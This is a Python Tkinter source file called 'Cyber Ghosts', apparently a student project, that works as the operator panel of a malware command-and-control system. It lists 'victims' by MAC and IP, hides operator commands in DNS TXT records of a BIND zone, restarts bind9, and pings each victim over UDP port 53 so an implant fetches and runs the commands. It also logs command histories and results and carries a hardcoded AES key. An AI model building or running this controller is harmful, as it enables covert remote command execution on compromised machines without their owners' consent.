# -*- coding: utf-8 -*-
#!/usr/bin/env python

from Tkinter import *
from Crypto.Cipher import AES
import os
import base64
import subprocess
import datetime
import time
import socket

VICTIMS_DIR = '/home/lucas/'
VICTIMS_FILE = 'VICTIMS'
VICTIMS_SEPARATOR = '_'
VICTIMS_HISTORY_DIR = 'history/'
EXECUTE_PORT = 53
DNS_TEMPLATE_FILE = 'db.mydomain'
DNS_CONFIG_FILE = '/etc/bind/db.mydomain'


def updateVictims(listbox):
    with open(VICTIMS_FILE) as f:
        lines = f.readlines()
    listbox.delete(0, END)
    for line in lines:
        mac, ip = line.rstrip('\n').split(';')
        listbox.insert(END, mac + VICTIMS_SEPARATOR + ip)
    listbox.selection_set(0)


def execute(item, commands):
    commands = commands.split('\n')
    commands.pop() # Last element is empty
    now = datetime.datetime.now()
    mac, ip = item.split(VICTIMS_SEPARATOR)
    # Get template contents
    with open(DNS_TEMPLATE_FILE) as f:
        file_str = f.read()
    # Update serial number
    file_str = file_str.replace("YYYYMMDD", str(now.year) + str('%02d' % now.month) + str('%02d' % now.day))
    file_str += '\n'
    # Add TXT entries with the commands
    i = 0
    length = len(commands)
    for x in commands:
        file_str += "order" + str(i) + " IN TXT \"" + x
        if (i < length - 1):
            file_str += ';' + str(i+1)
        else:
            file_str += ';-1'
        file_str += '"\n'
        i += 1
    # Save as a new file
    with open(DNS_CONFIG_FILE, "w") as f:
        f.write(file_str)
    # Restart bind service
    subprocess.call(['/usr/sbin/service', 'bind9', 'restart'], shell=False)
    # Wait for the service to restart
    time.sleep(3)
    # Send signal packet for a new command
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto("1", (ip, EXECUTE_PORT))
    # Save commands to victim's history file
    file_str = str(now.year) + '-' + str('%02d' % now.month) + '-' + str('%02d' % now.day)
    file_str += ' ' + str(now.hour) + ':' + str('%02d' % now.minute) + ':' + str('%02d' % now.second)
    file_str += '\n'
    for x in commands:
        file_str += x + '"\n'
    with open(VICTIMS_HISTORY_DIR + mac, 'a+') as f:
        f.write(file_str)


def open_folder(item):
    mac, ip = item.split(VICTIMS_SEPARATOR)
    path = VICTIMS_DIR + mac
    subprocess.Popen(["xdg-open", path])

def onselect(event, rightTop, resultList):
	# Do a loop through the file that list the commands
	w = event.widget
	sel = w.curselection()
	value = w.get(sel)
	mac, ip = value.split(VICTIMS_SEPARATOR)
	file = open(VICTIMS_HISTORY_DIR + mac)
	files = os.listdir(VICTIMS_DIR + mac)
	rightTop.delete(0, END)
	resultList.delete(0, END)
	#history part
	for line in file:
		#print line 
		rightTop.insert(END, line.rstrip('\n'))
	#results part
	for fil in files:
		resultList.insert(END, fil.rstrip('\n'))

def encryption(command):    
    BLOCK_SIZE = 32 
    PADDING = '{'   
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING    
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))    
    key = 'g0vwQgZcBCfFNduQCGFVUvudv8gUMPYp'    
    cipher = AES.new(key)   
    encoded = EncodeAES(cipher, command)
    return encoded


class Application(Frame):
	     

    def createWidgets(self):
     
        topContainer = Frame(root, padx=30, pady=5)
        bottomContainer = Frame(root, padx=30, pady=5)
        leftFrame = Frame(topContainer, padx=30, pady=30)
        centralFrame = Frame(topContainer, padx=30, pady=30)
        rightFrame = Frame(topContainer, padx=30, pady=30)
        bottomFrame = Frame(bottomContainer, padx=30, pady=0)

        #left side
        #List of victims
        leftTopFrame = Frame(leftFrame, padx=30, pady=30)
        leftBottomFrame = Frame(leftFrame, padx=30, pady=30)        

        #left top frame
        leftTopTitle = Entry(leftFrame, width=35)
        leftTopTitle.insert(0, "LIST OF VICTIMS")
        leftTopTitle.configure(state='readonly')

        leftTopLb = Listbox(leftTopFrame, height=23, width=40)
        updateVictims(leftTopLb)      

        leftTopSb = Scrollbar(leftTopFrame, orient=VERTICAL)

        leftTopSb.configure(command=leftTopLb.yview)
        leftTopLb.configure(yscrollcommand=leftTopSb.set)

            
        #left bottom frame

        leftBottomBt = Button(leftBottomFrame, text="Refresh", command=lambda: updateVictims(leftTopLb),  bg="gray", fg="black", padx=12, pady=7)

        
        #left pack
        leftTopTitle.pack(side=TOP)
        leftTopLb.pack(side=LEFT)
        leftTopSb.pack(side=LEFT, fill=Y)
        leftBottomBt.pack(side=LEFT)       
        leftTopFrame.pack(side=TOP)       
        leftBottomFrame.pack(side=BOTTOM)
        leftFrame.pack(side=LEFT)    


        #Central side
        #Display Results

        centralTopFrame = Frame(centralFrame, padx=30, pady=30)
        centralBottomFrame = Frame(centralFrame, padx=30, pady=30)

        #central top Frame
        centralTopTitle = Entry(centralFrame, width=35)
        centralTopTitle.insert(0, "RESULTS")
        centralTopTitle.configure(state='readonly')

        centralTopLb = Listbox(centralTopFrame, height=23, width=40)
             

        centralTopSb = Scrollbar(centralTopFrame, orient=VERTICAL)

        centralTopSb.configure(command=centralTopLb.yview)
        centralTopLb.configure(yscrollcommand=centralTopSb.set)

        #central bottom Frame


        centralBottomBt = Button(centralBottomFrame, text="Open Folder", command=lambda: open_folder(leftTopLb.get(ACTIVE)), bg="gray", fg="black", padx=12, pady=7)

        
        #central pack
        centralTopTitle.pack(side=TOP)
        centralTopLb.pack(side=LEFT)
        centralTopSb.pack(side=LEFT, fill=Y)
        centralBottomBt.pack(side=LEFT)        
        centralTopFrame.pack(side=TOP)     
        centralBottomFrame.pack(side=BOTTOM)
        centralFrame.pack(side=LEFT)    



        #Right side    
        #history of command and next command

        rightTopFrame = Frame(rightFrame, padx=30, pady=30)
        rightBottomFrame = Frame(rightFrame, padx=30, pady=10)

        #right top Frame
        #history of command 

        rightTopTitle = Entry(rightFrame, width=35)
        rightTopTitle.insert(0, "HISTORY OF COMMANDS")
        rightTopTitle.configure(state='readonly')

        rightTopLb = Listbox(rightTopFrame, height=10, width=40)
	

        rightTopSb = Scrollbar(rightTopFrame, orient=VERTICAL)

        rightTopSb.configure(command=rightTopLb.yview)
        rightTopLb.configure(yscrollcommand=rightTopSb.set)

        #right bottom Frame
        #next command

        rightBottomTitle = Entry(rightBottomFrame, width=35)
        rightBottomTitle.insert(0, "NEXT COMMAND")
        rightBottomTitle.configure(state='readonly')

        rightBottomText = Text(rightBottomFrame, height=9, width=35)

        rightBottomBt = Button(rightBottomFrame, text="Run Command", command=lambda: execute(leftTopLb.get(ACTIVE), rightBottomText.get(1.0, END)), bg="gray", fg="black", padx=12, pady=7)
        
        #right pack       
                
        rightBottomBt.pack(side=BOTTOM, pady=15)
        rightBottomText.pack(side=BOTTOM)  
        rightBottomTitle.pack(side=BOTTOM, pady=20)               
        rightTopTitle.pack(side=TOP)        
        rightTopLb.pack(side=LEFT)
        rightTopSb.pack(side=LEFT, fill=Y)        
        rightTopFrame.pack(side=TOP)
        rightBottomFrame.pack(side=BOTTOM)
        rightFrame.pack(side=LEFT)    

	resultSelect = leftTopLb.bind('<<ListboxSelect>>', lambda event: onselect(event, rightTopLb, centralTopLb))


        #Bottom side

        bottomCredits = Text(bottomFrame, width=35, height=9)
        bottomCredits.insert(END, " CREDITS\n Alana Ribeiro\n Deividy Negri\n Jesse Jacoby\n Lucas Vaccaro")
        bottomCredits.configure(state='disabled', fg="black", bg="grey")

        bottomCredits.pack(side=BOTTOM, padx=30, pady=10)
        bottomFrame.pack(side=LEFT)





        topContainer.pack(side=TOP)
        bottomContainer.pack(side=BOTTOM)


    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.pack()
        self.createWidgets()

root = Tk()
root.wm_title("Cyber Ghosts")
app = Application(master=root)
app.mainloop()
